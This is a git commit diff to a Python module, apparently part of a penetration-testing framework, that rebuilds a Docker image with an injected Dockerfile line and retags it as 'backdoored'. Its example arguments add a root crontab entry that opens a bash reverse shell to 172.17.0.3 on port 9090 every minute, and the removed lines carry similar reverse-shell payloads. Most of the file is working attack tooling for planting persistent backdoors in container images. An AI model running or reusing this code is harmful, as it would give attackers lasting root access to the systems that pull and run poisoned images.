00cb4bdfe4baccc1bce1890f632a4df39844bcb9
Jack Ganbold <jack.ganbold@rhinosecuritylabs.com>
2019-08-05 07:30:19 -0700

    Fix reverse shell backdoor

--- modules/docker__backdoor_reverse_shell/main.py
+++ modules/docker__backdoor_reverse_shell/main.py
@@ -2,8 +2,12 @@ import docker
 from io import BytesIO
 
 
+#   TODO: Seperate target_image_tag and build_image_tag
 #   TODO: Fix reverse shell
 #   TODO: Let reverse shell works with different types OS images
+#   TODO: Add manual entry for script
+#   TODO: Add public key backdoor
+#   TODO: Add crontab backdoor
 
 
 module_info = {
@@ -19,18 +23,14 @@ module_info = {
 }
 
 
-def get_dockerfile_like_obj(target_image, script):
-    dockerfile = '''
-    FROM {}
-    RUN echo 'Hello, from Rhino.' >backdoor3.txt
-    {}
-    '''.format(target_image, script)
+def get_dockerfile_like_obj(target_image, injection):
+    dockerfile = 'FROM {}\n{}'.format(target_image, injection)
     return BytesIO(dockerfile.encode('utf-8'))
 
 
-def docker_build(docker_client, target_image, script):
-    docker_fileobj=get_dockerfile_like_obj(target_image, script)
-    return docker_client.images.build(fileobj=docker_fileobj, rm=True, tag=target_image)
+def docker_build(docker_client, target_image, injected_image, injection):
+    docker_fileobj=get_dockerfile_like_obj(target_image, injection)
+    return docker_client.images.build(fileobj=docker_fileobj, rm=True, tag=injected_image)
 
 
 def main(args):
@@ -39,21 +39,23 @@ def main(args):
         'payload': {}
     }
 
-    target_image = args['repository_uri'] + ":" + args['tag'] 
+    target_image = args['repository_uri'] + ":" + args['target_image_tag'] 
+    injected_image = args['repository_uri'] + ":" + args['build_image_tag'] 
     docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')
 
     try:
-        docker_build_response = docker_build(docker_client, target_image, args['script'])
+        docker_build_response = docker_build(docker_client, target_image, injected_image, args['injection'])
     except Exception as e:
         print(e)
 
-    out = 'Built {} and attached a reverse shell backdoor'.format(docker_build_response)
+    out = 'Built {} and injected'.format(docker_build_response)
     print(out)
 
     data['payload'].update({
         'repository_uri': args['repository_uri'],
-        'tag': args['tag'],
-        'script': args['script']
+        'target_image_tag': args['target_image_tag'],
+        'build_image_tag': args['build_image_tag'],
+        'injection': args['injection']
     })
     
     data['count'] = 1
@@ -63,7 +65,7 @@ def main(args):
 
 def summary(data):
     out = ''
-    out += '{} Image backdoored'.format(data['count'])
+    out += '{} Images injected'.format(data['count'])
     return out
 
 
@@ -71,13 +73,11 @@ if __name__ == "__main__":
     print('Running module {}...'.format(module_info['name']))
 
     args = {
-        'repository_uri': 'ubuntu',
-        'tag': 'latest',
-        'script': 'CMD ["bash -i >& /dev/tcp/172.17.0.3/9090 0>&1"]'
+        'repository_uri': 'nginx',
+        'target_image_tag': 'latest',
+        'build_image_tag':'backdoored',
+        'injection': 'RUN apt-get update && apt-get -y install cron && echo "* * * * * root bash -c \'bash -i >& /dev/tcp/172.17.0.3/9090 0>&1\'" >> /etc/crontab && echo "" >> /etc/crontab\nCMD cron && nginx -g \'daemon off;\''
     }
-
-    # 216825089941.dkr.ecr.us-east-1.amazonaws.com/pacu
-    # 'script': 'CMD ["/bin/bash","-c","echo -e \"* * * * * root bash -i >& /dev/tcp/172.17.0.3/9090 0>&1\\n\" >> /etc/crontab"]'
 
     data = main(args) 
 
